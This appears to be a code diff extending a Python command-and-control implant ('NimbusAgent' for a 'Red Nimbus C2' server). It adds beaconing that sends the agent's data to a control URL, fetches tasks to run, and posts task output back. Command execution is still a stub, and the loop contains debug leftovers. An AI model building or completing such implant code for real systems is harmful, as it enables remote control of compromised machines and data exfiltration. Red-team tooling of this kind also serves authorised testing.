@@ -127,14 +127,15 @@ class NimbusAgent:
 # -=-=-=-=-=-=-=-=-=-=-=-=-=
 
     def get_tasking(self):
+        get_task_url = URL + "get"
         tasking = ""
-        logging.debug(f"sending get_tasking request to: {URL}")
+        logging.debug(f"sending get_tasking request to: {get_task_url}")
         try:
-            # convert agent class members to JSON and URL encode
-            post_data = parse.urlencode(self.__dict__).encode()
+            # convert agent class members to JSON
+            post_data = json.dumps(self.__dict__)
 
             # send POST request to control server
-            req = request.Request(URL, data=post_data)
+            req = request.Request(get_task_url, bytes(post_data, "utf-8"))
             resp = request.urlopen(req)
 
             # read response
@@ -147,8 +148,28 @@ class NimbusAgent:
 
         return tasking
 
-    def post_tasking_output(self):
-        logging.warning("sorry, this function is not implemented")
+    def post_tasking_output(self, task_output):
+        post_task_url = URL + "out"
+        tasking = ""
+        logging.debug(f"sending post_tasking_output request to: {post_task_url}")
+        try:
+            # convert agent class members to JSON and URL encode
+            post_data = parse.urlencode(task_output).encode()
+
+            # send POST request to control server
+            req = request.Request(post_task_url, data=post_data)
+            resp = request.urlopen(req)
+
+            # read response
+            html = resp.read()
+            tasking = html.decode("utf-8")
+            logging.debug(tasking)
+        except Exception as e:
+            logging.error(e)
+            return ""
+
+        return tasking
+
 
     def exec_tasking(self, task, arguments):
         logging.warning("sorry, this function is not implemented")
@@ -239,13 +260,19 @@ def main(args):
         logging.debug("getting task from Red Nimbus C2")
         task = agent.get_tasking()
 
+        task_output = ""
         if not task:
             logging.debug("did not receive a task, restarting C2 loop")
             continue
         else:
-            logging.debug("received new task")
+            logging.debug(f"received new task: {task}")
+            return
             cmd, task_args = extract_task_and_arguments(task)
-            agent.exec_tasking()
+            task_output = agent.exec_tasking(cmd, task_args)
+            # !!!!! fix me !!!!!!
+            task_output = {"task_output": "asdsadjasldjlaksjdklasjdlkj"}
+            response = agent.post_tasking_output(task_output)
+            print(response)
 
         # sleep again
         time.sleep(agent.get_sleep_interval())
